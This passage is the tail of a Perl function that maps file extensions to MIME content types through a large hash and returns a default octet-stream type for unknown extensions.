	TSV		=> 'text/tab-separated-values',
	NFO		=> 'text/warez-info',
	ETX		=> 'text/x-setext',
	SGML		=> 'text/x-sgml',
	SGM		=> 'text/x-sgml',
	TALK		=> 'text/x-speech',
	CGI		=> 'text/plain',
	PL		=> 'text/plain',
	INI		=> 'text/plain',
	EML		=> 'message/rfc822',

	COD		=> 'image/cis-cod',
	FID		=> 'image/fif',
	GIF		=> 'image/gif',
	ICO		=> 'image/ico',
	IEF		=> 'image/ief',
	JPEG		=> 'image/jpeg',
	JPG		=> 'image/jpeg',
	JPE		=> 'image/jpeg',
	PNG		=> 'image/png',
	TIF		=> 'image/tiff',
	TIFF		=> 'image/tiff',
	MCF		=> 'image/vasa',
	RAS		=> 'image/x-cmu-raster',
	CMX		=> 'image/x-cmx',
	PCD		=> 'image/x-photo-cd',
	PNM		=> 'image/x-portable-anymap',
	PBM		=> 'image/x-portable-bitmap',
	PGM		=> 'image/x-portable-graymap',
	PPM		=> 'image/x-portable-pixmap',
	RGB		=> 'image/x-rgb',
	XBM		=> 'image/x-xbitmap',
	XPM		=> 'image/x-xpixmap',
	XWD		=> 'image/x-xwindowdump',

	EXE		=> 'application/octet-stream',
	BIN		=> 'application/octet-stream',
	DMS		=> 'application/octet-stream',
	LHA		=> 'application/octet-stream',
	CLASS		=> 'application/octet-stream',
	DLL		=> 'application/octet-stream',
	AAM		=> 'application/x-authorware-map',
	AAS		=> 'application/x-authorware-seg',
	AAB		=> 'application/x-authorware-bin',
	VMD		=> 'application/vocaltec-media-desc',
	VMF		=> 'application/vocaltec-media-file',
	ASD		=> 'application/astound',
	ASN		=> 'application/astound',
	DWG		=> 'application/autocad',
	DSP		=> 'application/dsptype',
	DFX		=> 'application/dsptype',
	EVY		=> 'application/envoy',
	SPL		=> 'application/futuresplash',
	IMD		=> 'application/immedia',
	HQX		=> 'application/mac-binhex40',
	CPT		=> 'application/mac-compactpro',
	DOC		=> 'application/x-msword',
	ODA		=> 'application/oda',
	PDF		=> 'application/pdf',
	AI		=> 'application/postscript',
	EPS		=> 'application/postscript',
	PS		=> 'application/postscript',
	PPT		=> 'application/powerpoint',
	RTF		=> 'application/rtf',
	APM		=> 'application/studiom',
	XAR		=> 'application/vnd.xara',
	ANO		=> 'application/x-annotator',
	ASP		=> 'application/x-asap',
	CHAT		=> 'application/x-chat',
	BCPIO		=> 'application/x-bcpio',
	VCD		=> 'application/x-cdlink',
	TGZ		=> 'application/x-compressed',
	Z		=> 'application/x-compress',
	CPIO		=> 'application/x-cpio',
	PUZ		=> 'application/x-crossword',
	CSH		=> 'application/x-csh',
	DCR		=> 'application/x-director',
	DIR		=> 'application/x-director',
	DXR		=> 'application/x-director',
	FGD		=> 'application/x-director',
	DVI		=> 'application/x-dvi',
	LIC		=> 'application/x-enterlicense',
	EPB		=> 'application/x-epublisher',
	FAXMGR		=> 'application/x-fax-manager',
	FAXMGRJOB	=> 'application/x-fax-manager-job',
	FM		=> 'application/x-framemaker',
	FRAME		=> 'application/x-framemaker',
	FRM		=> 'application/x-framemaker',
	MAKER		=> 'application/x-framemaker',
	GTAR		=> 'application/x-gtar',
	GZ		=> 'application/x-gzip',
	HDF		=> 'application/x-hdf',
	INS		=> 'application/x-insight',
	INSIGHT		=> 'application/x-insight',
	INST		=> 'application/x-install',
	IV		=> 'application/x-inventor',
	JS		=> 'application/x-javascript',
	SKP		=> 'application/x-koan',
	SKD		=> 'application/x-koan',
	SKT		=> 'application/x-koan',
	SKM		=> 'application/x-koan',
	LATEX		=> 'application/x-latex',
	LICMGR		=> 'application/x-licensemgr',
	MAIL		=> 'application/x-mailfolder',
	MIF		=> 'application/x-mailfolder',
	NC		=> 'application/x-netcdf',
	CDF		=> 'application/x-netcdf',
	SDS		=> 'application/x-onlive',
	SH		=> 'application/x-sh',
	SHAR		=> 'application/x-shar',
	SWF		=> 'application/x-shockwave-flash',
	SPRITE		=> 'application/x-sprite',
	SPR		=> 'application/x-sprite',
	SIT		=> 'application/x-stuffit',
	SV4CPIO		=> 'application/x-sv4cpio',
	SV4CRC		=> 'application/x-sv4crc',
	TAR		=> 'application/x-tar',
	TARDIST		=> 'application/x-tardist',
	TCL		=> 'application/x-tcl',
	TEX		=> 'application/x-tex',
	TEXINFO		=> 'application/x-texinfo',
	TEXI		=> 'application/x-texinfo',
	T		=> 'application/x-troff',
	TR		=> 'application/x-troff',
	TROFF		=> 'application/x-troff',
	MAN		=> 'application/x-troff-man',
	ME		=> 'application/x-troff-me',
	MS		=> 'application/x-troff-ms',
	TVM		=> 'application/x-tvml',
	TVM		=> 'application/x-tvml',
	USTAR		=> 'application/x-ustar',
	SRC		=> 'application/x-wais-source',
	WKZ		=> 'application/x-wingz',
	ZIP		=> 'application/x-zip-compressed',
	ZTARDIST	=> 'application/x-ztardist',

	AU		=> 'audio/basic',
	SND		=> 'audio/basic',
	ES		=> 'audio/echospeech',
	MID		=> 'audio/midi',
	KAR		=> 'audio/midi',
	MPGA		=> 'audio/mpeg',
	MP2		=> 'audio/mpeg',
	TSI		=> 'audio/tsplayer',
	VOX		=> 'audio/voxware',
	AIF		=> 'audio/x-aiff',
	AIFC		=> 'audio/x-aiff',
	AIFF		=> 'audio/x-aiff',
	MID		=> 'audio/x-midi',
	MP3		=> 'audio/x-mpeg',
	MP2A		=> 'audio/x-mpeg2',
	MPA2		=> 'audio/x-mpeg2',
	M3U		=> 'audio/x-mpegurl',
	MP3URL		=> 'audio/x-mpegurl',
	PAT		=> 'audio/x-pat',
	RAM		=> 'audio/x-pn-realaudio',
	RPM		=> 'audio/x-pn-realaudio-plugin',
	RA		=> 'audio/x-realaudio',
	SBK		=> 'audio/x-sbk',
	STR		=> 'audio/x-str',
	WAV		=> 'audio/x-wav',

	MPEG		=> 'video/mpeg',
	MPG		=> 'video/mpeg',
	MPE		=> 'video/mpeg',
	QT		=> 'video/quicktime',
	MOV		=> 'video/quicktime',
	VIV		=> 'video/vivo',
	VIVO		=> 'video/vivo',
	MPS		=> 'video/x-mpeg-system',
	SYS		=> 'video/x-mpeg-system',
	MP2V		=> 'video/x-mpeg2',
	MPV2		=> 'video/x-mpeg2',
	AVI		=> 'video/x-msvideo',
	MV		=> 'video/x-sgi-movie',
	MOVIE		=> 'video/x-sgi-movie',

	PDB		=> 'chemical/x-pdb',
	XYZ		=> 'chemical/x-pdb',
	CHM		=> 'chemical/x-cs-chemdraw',
	SMI		=> 'chemical/x-daylight-smiles',
	SKC		=> 'chemical/x-mdl-isis',
	MOL		=> 'chemical/x-mdl-molfile',
	RXN		=> 'chemical/x-mdl-rxn',
	SMD		=> 'chemical/x-smd',
	ACC		=> 'chemical/x-synopsys-accord',
	ICE		=> 'x-conference/x-cooltalk',
	SVR		=> 'x-world/x-svr',
	WRL		=> 'x-world/x-vrml',
	VRML		=> 'x-world/x-vrml',
	VRJ		=> 'x-world/x-vrt',
	VRJT		=> 'x-world/x-vrt'

	);

	$ext =~ s/^.*\.//;

	return $ctype{uc $ext} || 'application/octet-stream';
}
